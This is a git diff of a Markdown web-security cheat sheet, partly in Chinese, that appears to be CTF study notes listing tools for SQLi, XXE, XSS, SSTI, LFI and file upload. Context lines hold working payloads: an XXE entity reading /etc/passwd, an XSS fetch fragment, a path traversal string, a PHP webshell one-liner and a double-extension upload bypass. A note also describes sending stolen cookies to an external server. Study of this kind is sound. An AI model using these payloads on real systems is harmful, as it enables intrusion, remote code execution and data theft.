@@ -17,17 +17,17 @@ date: 2024-02-07
     * `.DS_Store`: lijiejie/ds_store_exp
     * `gitleak`: denny0223/scrabble
 
-### [All-Injection:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md)
+### Injection
 * SQLi
     * [SQLMAP1](https://ithelp.ithome.com.tw/articles/10249487)
     * [SQLMAP2](https://ithelp.ithome.com.tw/articles/10202811)
-* XXE
+* XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
     ```html
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
         <data><ID>&xxe;</ID></data>
     ```
-* [XSS-CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+* XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
     ```javascript
     </script><script>
     fetch(`/getflag\)
@@ -37,6 +37,8 @@ date: 2024-02-07
     </script>
     ```
 * [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
+* SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/): 
+    * 用[tplmap](https://github.com/epinna/tplmap)直接打
 
 ### 其他
 * LFI: `../../../flag.txt`
@@ -44,7 +46,6 @@ date: 2024-02-07
     * 
 * 前端: 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)
 * SSRF
-* SSTI: 用[tplmap](https://github.com/epinna/tplmap)直接打
 * 上傳: 
     * 如果沒有任何保護: 直接upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到RCE
     * 如果有保護但只看extension: 那就偽造extension後夾帶webshell達到RCE(`webshell.png.php`)
